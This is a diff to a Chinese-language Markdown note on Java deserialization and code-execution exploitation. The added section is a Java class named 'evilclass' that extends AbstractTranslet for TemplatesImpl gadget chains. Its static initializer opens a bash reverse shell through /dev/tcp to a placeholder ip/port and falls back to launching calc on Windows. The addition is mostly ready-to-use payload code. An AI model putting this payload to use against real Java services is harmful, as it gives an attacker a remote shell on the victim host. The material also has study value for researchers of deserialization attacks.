@@ -116,9 +116,43 @@ public static String FiletoBytes(String filename) throws Exception{
 ```
 
 由于没有是研究tomcat等容器的回显。能力有限。
+
 参考：https://l3yx.github.io/2020/03/31/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/
 
 直接用项目的代码。
+
+在利用tempimpl创建类的时候可以使用如下代码
+```
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import java.io.IOException;
+
+public class evilclass extends AbstractTranslet  {
+    static {
+        try{
+            Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","exec 5<>/dev/tcp/ip/port;cat <&5 | while read line; do $line 2>&5 >&5; done"});
+        }catch (IOException e){
+            try{
+                Runtime.getRuntime().exec(new String[]{"cmd", "/c", "calc"});
+            }catch (IOException ee){
+            }
+        }
+    }
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
+}
+```
 
 
 >参考：
